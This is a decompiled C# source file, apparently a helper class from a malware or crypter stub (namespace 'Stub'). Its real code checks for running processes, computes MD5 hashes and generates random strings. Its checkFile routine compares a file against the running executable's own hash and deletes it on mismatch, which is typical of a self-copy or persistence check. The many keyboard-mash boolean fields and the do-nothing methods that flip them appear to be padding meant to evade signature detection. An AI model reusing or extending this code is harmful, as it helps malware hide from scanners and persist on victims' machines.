using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Stub;

internal class cFunctions
{
	public bool fsdgsdfssdgsdfgsdfgdfgsdfdfs = true;

	public bool fsdgsaasdgdfgsdfdfsdfgsdfdfs = true;

	public bool fsdgsdfasdgfsdgsdfgsasdfsdfgsdfdfs = true;

	public bool fsdgsdassdfgsdfgsdfgsffsdfgsdfdfs = true;

	public bool fsdgsdvzxdfbjhdffdfsdfgsdfdfs = true;

	public bool fsdghdgsdfgertewterfgsdfdfs = true;

	public bool fsdgdgjsdfswersdfdfgsdfdfs = true;

	public bool fsdgsdfsddgstywertfdfgsdfdfs = true;

	public bool sdfgsdfgsdfgsdgsdgfgsdfhsdf = true;

	public bool fsdgsdsdffssdfgghfgsdfdfs = true;

	public bool fsdgsdsdfgsdfgrtyfgsdfdfs = true;

	public bool fsdgsdfsssfsfgdqwefgsdfdfs = true;

	public bool fsdgsdfsdfgsghfgdgfgsasdfdfdfs = true;

	public bool fsdgsdfsdfgfhyjytjsdfdfsdfdfs = true;

	public bool fsdgsdffghdfghfgdfhfhddfgsdfdfs = true;

	public bool fsdgsdfgsdfgsdfgsdfgdfg34554sdfdfs = true;

	public bool fsdgsfgsd3453fgdfggsdfdfsdfgsdfdfs = true;

	public bool fsdgsdfasdfsdgs3fgsdfsasdfsdfgsdfdfs = true;

	public bool fsdgsdassdfgs5gsdfgsdfdffsdfgsdfdfs = true;

	public bool fsdgsdasgxd345345fbjhdffdfsdfgsdfdfs = true;

	public bool fsdghdgsdfsrtewterfgsdfdfs = true;

	public bool fsdgdgjsdfswe57566rdfdfgsdfdfs = true;

	public bool fsdgsdfsddgs4556345tsdgfgsdfhsdf = true;

	public bool fsdgsdsd463465sdghjffgsdfdfs = true;

	public bool fsdgsdfgf3hsdsdfgsdfgrtyfgsdfdfs = true;

	public bool fsdgsdfsss6778fhgsdfgdqwefgsdfdfs = true;

	public bool fsdgsdf5475464sdfgsgdghsdfgsasdfdfdfs = true;

	public bool fsdgsdf769787890dfgfhsdfgdfsdfsdfdfs = true;

	public bool fsdgsdffgsshfghdfgh89899fggfhddfsdfdfs = true;

	private void sdfgssdsdfgfgsdfgdgsdgsdfsadfgsdfgsdfdf()
	{
		fsdgsdf769787890dfgfhsdfgdfsdfsdfdfs = false;
	}

	private void sdfgsdgsjhkkjdgsdfwergdfdfgsdfgsdfgsdfdf()
	{
		fsdgdgjsdfswe57566rdfdfgsdfdfs = false;
	}

	public bool checkProcess(string sProcessName)
	{
		return Process.GetProcessesByName(sProcessName).Length > 0;
	}

	private void sdfgsd34dfgsssdfdfsdfdfgsdfgsdfsdfdf()
	{
		fsdgsdassdfgs5gsdfgsdfdffsdfgsdfdfs = false;
	}

	private void sdfgsdgsdfhgfsdfgsdfgsdfgsdfdf()
	{
		fsdgsdfasdfsdgs3fgsdfsasdfsdfgsdfdfs = false;
	}

	private string FileMD5(string sFileName)
	{
		FileStream fileStream = File.OpenRead(sFileName);
		MD5 mD = new MD5CryptoServiceProvider();
		byte[] array = mD.ComputeHash(fileStream);
		fileStream.Close();
		return BitConverter.ToString(array).Replace("-", "").ToUpper();
	}

	public string getMD5Hash(string sString)
	{
		MD5 mD = new MD5CryptoServiceProvider();
		byte[] array = mD.ComputeHash(Encoding.Default.GetBytes(sString));
		string text = BitConverter.ToString(array).Replace("-", "").ToLower();
		return text.ToUpper();
	}

	private void sdfgssdfsdfgsdfgsdfdgsdfgasdfsdfgsdfgsdfdf()
	{
		fsdgsdffgsshfghdfgh89899fggfhddfsdfdfs = false;
	}

	public string genString(int iLen)
	{
		Random random = new Random();
		string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		string text2 = string.Empty;
		for (int i = 0; i < iLen; i++)
		{
			text2 += text.Substring(random.Next(0, text.Length), 1);
		}
		return text2;
	}

	public bool checkFile(string FilePath)
	{
		if (!File.Exists(FilePath))
		{
			return false;
		}
		if (FileMD5(FilePath) != FileMD5(Process.GetCurrentProcess().MainModule!.FileName))
		{
			File.Delete(FilePath);
			return false;
		}
		return true;
	}
}
